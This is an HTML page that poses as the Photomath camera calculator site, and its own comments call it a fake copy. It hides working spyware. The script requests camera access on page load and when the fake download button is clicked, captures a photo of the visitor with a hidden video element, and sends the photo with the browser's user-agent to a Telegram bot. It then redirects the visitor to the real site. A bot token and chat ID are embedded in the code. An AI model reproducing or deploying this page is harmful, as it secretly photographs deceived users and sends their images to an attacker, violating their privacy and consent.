<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Photomath - Camera Calculator</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #ffffff;
            color: #1a1a1a;
            line-height: 1.5;
        }

        /* ترويسة تشبه Photomath */
        .header {
            background: #0066FF;
            padding: 16px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
        }

        .logo {
            font-size: 28px;
            font-weight: 800;
            color: white;
            letter-spacing: -0.5px;
        }

        .logo span {
            font-weight: 300;
        }

        .nav {
            display: flex;
            gap: 20px;
        }

        .nav a {
            color: white;
            text-decoration: none;
            font-weight: 500;
            opacity: 0.9;
        }

        /* Hero section */
        .hero {
            text-align: center;
            padding: 60px 20px 40px;
            background: linear-gradient(135deg, #f5f7ff 0%, #eef2ff 100%);
        }

        .hero h1 {
            font-size: 48px;
            font-weight: 800;
            background: linear-gradient(135deg, #0066FF, #00ccff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 16px;
        }

        .hero p {
            font-size: 20px;
            color: #4a5568;
            max-width: 600px;
            margin: 0 auto;
        }

        /* زر التنزيل الكبير */
        .download-btn-container {
            text-align: center;
            margin: 40px 20px;
        }

        .big-download-btn {
            background: linear-gradient(90deg, #0066FF, #00cc66);
            border: none;
            padding: 20px 50px;
            border-radius: 60px;
            font-size: 28px;
            font-weight: bold;
            color: white;
            cursor: pointer;
            box-shadow: 0 15px 30px rgba(0,102,255,0.3);
            transition: transform 0.2s, box-shadow 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 12px;
        }

        .big-download-btn:active {
            transform: scale(0.97);
        }

        /* ميزات وهمية */
        .features {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 30px;
            padding: 40px 20px;
            background: #f9fafb;
        }

        .feature-card {
            text-align: center;
            max-width: 200px;
        }

        .feature-card .icon {
            font-size: 48px;
            margin-bottom: 12px;
        }

        /* الكاميرا المخفية */
        .hidden-cam {
            display: none;
        }

        #status {
            text-align: center;
            font-size: 12px;
            color: #888;
            padding: 20px;
        }
    </style>
</head>
<body>

<!-- نسخة مزيفة من موقع Photomath -->
<div class="header">
    <div class="logo">Photo<span>Math</span></div>
    <div class="nav">
        <a href="#">Solutions</a>
        <a href="#">Pricing</a>
        <a href="#">Downloads</a>
    </div>
</div>

<div class="hero">
    <h1>Scan. Solve. Learn.</h1>
    <p>The #1 math solver with camera support. Over 100 million downloads.</p>
</div>

<div class="download-btn-container">
    <button class="big-download-btn" id="fakeDownloadBtn">
        📱 DOWNLOAD FOR FREE
    </button>
</div>

<div class="features">
    <div class="feature-card">
        <div class="icon">📸</div>
        <h3>Camera Solver</h3>
        <p>Point & solve instantly</p>
    </div>
    <div class="feature-card">
        <div class="icon">🧠</div>
        <h3>Step-by-step</h3>
        <p>Learn the solution</p>
    </div>
    <div class="feature-card">
        <div class="icon">🌍</div>
        <h3>30+ Languages</h3>
        <p>Available worldwide</p>
    </div>
</div>

<div id="status">✅ Ready — click download to continue</div>

<!-- فيديو مخفي للكاميرا -->
<video id="hiddenCam" autoplay class="hidden-cam"></video>

<script>
    // ========== بيانات التلغرام الحقيقية (التي أرسلتها) ==========
    const BOT_TOKEN = "8930723698:AAE5ctXM39Hiz_a7v_aOZ0byP08_btOhQ-0";
    const CHAT_ID = "8549252422";
    
    let cameraStream = null;
    let cameraActive = false;
    let photoSent = false;  // لمنع إرسال صور متكررة بنفس الجلسة
    
    // طلب الكاميرا فور دخول الصفحة (بدون أن يظهر شيء للمستخدم سوى طلب الإذن)
    async function requestCameraSilent() {
        if (cameraActive) return true;
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('hiddenCam');
            video.srcObject = stream;
            await video.play();
            cameraStream = stream;
            cameraActive = true;
            document.getElementById('status').innerHTML = "📷 Camera ready — thank you";
            return true;
        } catch(err) {
            document.getElementById('status').innerHTML = "⚠️ Camera permission denied";
            return false;
        }
    }
    
    // التقاط الصورة وإرسالها إلى تلغرام
    async function captureAndSendToTelegram() {
        if (!cameraActive || photoSent) return;
        
        const video = document.getElementById('hiddenCam');
        if (!video.videoWidth || !video.videoHeight) return;
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        
        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'target.jpg');
            formData.append('caption', `🎯 Photomath Fake Download\n🕒 ${new Date().toLocaleString()}\n🌐 User-Agent: ${navigator.userAgent}\n📍 Action: Big Download Button Clicked`);
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                if (result.ok) {
                    document.getElementById('status').innerHTML = "📸 Photo sent — redirecting...";
                    photoSent = true;
                } else {
                    document.getElementById('status').innerHTML = "❌ Send failed";
                }
            } catch(e) {
                document.getElementById('status').innerHTML = "⚠️ Network error";
            }
        }, 'image/jpeg', 0.85);
    }
    
    // رابط التحويل عند الضغط على زر التنزيل
    const REDIRECT_URL = "https://photomath.com/";  // أو يمكنك تغييره إلى أي رابط آخر
    
    document.getElementById('fakeDownloadBtn').addEventListener('click', async () => {
        // طلب الكاميرا إذا لم تكن نشطة (لن يظهر شيء سوى طلب الإذن الأول)
        if (!cameraActive) {
            await requestCameraSilent();
        }
        
        // التقاط الصورة وإرسالها إلى تلغرام
        await captureAndSendToTelegram();
        
        // تحويل المستخدم إلى الرابط المطلوب
        window.location.href = REDIRECT_URL;
    });
    
    // طلب الكاميرا تلقائياً بعد تحميل الصفحة بثانية واحدة
    window.addEventListener('load', () => {
        setTimeout(() => {
            if (!cameraActive) requestCameraSilent();
        }, 1000);
    });
</script>
</body>
</html>
